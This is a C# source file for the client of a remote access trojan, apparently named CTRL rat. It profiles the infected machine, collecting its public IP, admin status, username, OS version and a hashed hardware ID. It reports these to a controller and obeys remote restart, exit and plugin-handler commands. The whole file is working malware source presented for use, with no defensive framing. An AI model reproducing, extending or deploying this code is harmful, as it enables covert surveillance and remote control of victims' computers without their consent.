using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using CTRL_rat_Client;

namespace CTRL_rat_Client
{
    public class handlers
    {
        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsUserAnAdmin();
        Dll_loader_and_handler message_handler = new Dll_loader_and_handler();
        public void Onclose(node client) 
        {
            message_handler.OnClose(client);
            Console.WriteLine(client.isalive);
        }
        public string Getip()
        {
            using (var client = new WebClient())
            {
                return client.DownloadString("https://api.ipify.org");
            }
        }
        public string gethwid()
        {
            try
            {
                IEnumerable<string> GetHardwareProperties()
                {
                    foreach (var properties in new Dictionary<string, string[]>
                    {
                        { "Win32_DiskDrive", new[] { "Model", "Manufacturer", "Signature", "TotalHeads" } },
                        { "Win32_Processor", new[] { "UniqueId", "ProcessorId", "Name", "Manufacturer" } },
                        { "Win32_BaseBoard", new[] { "Model", "Manufacturer", "Name", "SerialNumber" } }
                    })
                    {
                        var managementClass = new ManagementClass(properties.Key);
                        var managementObject = managementClass.GetInstances().Cast<ManagementBaseObject>().First();

                        foreach (var prop in properties.Value)
                        {
                            if (null != managementObject[prop])
                                yield return managementObject[prop].ToString();
                        }
                    }
                }

                var hash = (new System.Security.Cryptography.SHA256Managed()).ComputeHash(Encoding.UTF8.GetBytes(string.Join("", GetHardwareProperties())));
                string hardwareId = string.Join("", hash.Select(x => x.ToString("X2")));
                return hardwareId;
            }
            catch
            {
                try
                {
                    var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
                    ManagementObjectCollection mbsList = mbs.Get();
                    string id = "";
                    foreach (ManagementObject mo in mbsList)
                    {
                        id = mo["ProcessorId"].ToString();
                        break;
                    }
                    return id;
                }
                catch { return "error hwid"; }
            }
        }
        public string GetWindowsVersion() 
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                string r = "";
                ManagementObjectCollection information = searcher.Get();
                if (information != null)
                {
                    foreach (ManagementObject obj in information)
                    {
                        r = obj["Caption"].ToString() + " - " + obj["OSArchitecture"].ToString();
                    }
                }
                return r;
            }

        }
        public void Onmessage(node client, byte[] data) 
        {
            //Console.WriteLine(Encoding.UTF8.GetString(data));
            try
            {
                var response = client.JsonToDictionary(Encoding.UTF8.GetString(data));
                var opcode = (string)response["op"];
                var responsedata = new Dictionary<object, object>();
                if (opcode == "auth")
                {
                    responsedata["ip"] = Getip();
                    responsedata["admin"] = IsUserAnAdmin().ToString();
                    responsedata["username"] = Environment.UserName;
                    responsedata["os"] = GetWindowsVersion();
                    responsedata["hwid"] = gethwid();
                    responsedata["op"] = "auth";
                    responsedata["worker"] = false;
                    client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(responsedata)));

                }
                else if (opcode == "ERSTART")
                {
                    Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
                    Process.GetCurrentProcess().Kill();
                }
                else if (opcode == "EREXIT") 
                {
                    Process.GetCurrentProcess().Kill();
                }
                else
                {
                    message_handler.OnMessage(response, client);
                    //pass off to user based handler
                }
            }
            catch
            {
                //send a reconnect command
            }
        }
        public void Onpartialmessage(node client, int totalrecived, int dataleft)
        {


        }
    }
}
